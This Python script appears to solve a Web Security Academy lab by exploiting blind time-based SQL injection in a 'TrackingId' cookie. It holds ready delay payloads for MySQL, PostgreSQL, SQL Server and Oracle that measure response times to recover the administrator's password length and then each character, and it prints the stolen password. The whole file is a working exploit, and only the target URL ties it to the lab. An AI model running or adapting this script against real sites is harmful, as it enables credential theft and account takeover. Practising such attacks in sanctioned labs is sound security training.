import requests
import sys
from urllib.parse import quote_plus
import urllib3
import time

urllib3.disable_warnings()

# Target URL (replace with the actual lab URL)
TARGET = "https://0ab100ab0313f29a8109f72c00fd00d5.web-security-academy.net/"

# Proxy settings for debugging with tools like Burp Suite
PROXIES = {
    'http': 'http://127.0.0.1:8080'
}

# Template for injecting SQL payloads into the 'TrackingId' cookie
COOKIES = {
    "TrackingId": "{payload}"
}

# Define the range of characters to test for password extraction
CHAR_RANGES = list(range(48, 58)) + list(range(97, 123))  # ASCII for digits and lowercase letters

class SQLI:
    def __init__(self, target, dbms):
        self.target = target
        self.dbms = dbms

    def craft_query(self, template, **kwargs):
        return template.format(**kwargs)

    def get_request(self, query):
        cookies = {
            "TrackingId": COOKIES["TrackingId"].format(payload=quote_plus(query))
        }
        start_time = time.time()
        resp = requests.get(self.target, allow_redirects=False, proxies=PROXIES, cookies=cookies, verify=False)
        elapsed_time = time.time() - start_time
        return elapsed_time >= 3  # Check if delay is ≥ 3 seconds

    def find_password_length(self):
        for length in range(1, 51):  # Test lengths from 1 to 50
            query = self.craft_query(self.generate_length_payload(), length=length)
            print(f"Testing length: {length}")
            if self.get_request(query):
                print(f"Password length found: {length}")
                return length
        return None

    def extract_password(self, length):
        output = ""
        for position in range(1, length + 1):
            for test_val in CHAR_RANGES:
                sys.stdout.write(chr(test_val))
                sys.stdout.write('\b')
                sys.stdout.flush()

                query = self.craft_query(self.generate_char_payload(), position=position, char=test_val)
                if self.get_request(query):
                    output += chr(test_val)
                    break
        return output

    def generate_length_payload(self):
        # Generate a conditional time delay query for password length
        if self.dbms == "MySQL":
            return "X' OR IF((SELECT LENGTH(password) FROM users WHERE username='administrator') = {length}, SLEEP(3), 'a')--"
        elif self.dbms == "PostgreSQL":
            return "X' OR (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator') = {length} THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
        elif self.dbms == "Microsoft":
            return "X' IF((SELECT LEN(password) FROM users WHERE username='administrator') = {length}) WAITFOR DELAY '0:0:3'--"
        elif self.dbms == "Oracle":
            return "X' OR (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator') = {length} THEN 'a'||dbms_pipe.receive_message(('a'),3) ELSE NULL END FROM dual)--"
        else:
            raise ValueError("Unsupported DBMS")

    def generate_char_payload(self):
        # Generate a conditional time delay query for password characters
        if self.dbms == "MySQL":
            return "X' OR IF((SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE username='administrator') = {char}, SLEEP(3), 'a')--"
        elif self.dbms == "PostgreSQL":
            return "X' OR (SELECT CASE WHEN (SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE username='administrator') = {char} THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
        elif self.dbms == "Microsoft":
            return "X' IF((SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE username='administrator') = {char}) WAITFOR DELAY '0:0:3'--"
        elif self.dbms == "Oracle":
            return "X' OR (SELECT CASE WHEN (SELECT ASCII(SUBSTR(password, {position}, 1)) FROM users WHERE username='administrator') = {char} THEN 'a'||dbms_pipe.receive_message(('a'),3) ELSE NULL END FROM dual)--"
        else:
            raise ValueError("Unsupported DBMS")

    def generate_unconditional_delay_payload(self):
        # Generate an unconditional time delay payload
        if self.dbms == "MySQL":
            return "X' OR SLEEP(10)--"
        elif self.dbms == "PostgreSQL":
            return "X' OR (SELECT pg_sleep(10))--"
        elif self.dbms == "Microsoft":
            return "X' WAITFOR DELAY '0:0:10'--"
        elif self.dbms == "Oracle":
            return "X' OR dbms_pipe.receive_message(('a'),10)--"
        else:
            raise ValueError("Unsupported DBMS")


if __name__ == "__main__":
    # Change the 'dbms' variable to match the target DBMS (e.g., 'MySQL', 'PostgreSQL', etc.)
    dbms = "MySQL"  # Example: Target is MySQL
    sqli = SQLI(TARGET, dbms)

    print("STARTING")

    # Optional: Test an unconditional delay
    print("Testing unconditional delay...")
    test_payload = sqli.generate_unconditional_delay_payload()
    if sqli.get_request(test_payload):
        print("Unconditional delay successful!")

    # Step 1: Find the length of the password
    password_length = sqli.find_password_length()
    if not password_length:
        print("Unable to determine password length")
        sys.exit(1)

    # Step 2: Extract the password
    password = sqli.extract_password(password_length)
    print(f"Password: {password}")
    print("finished")
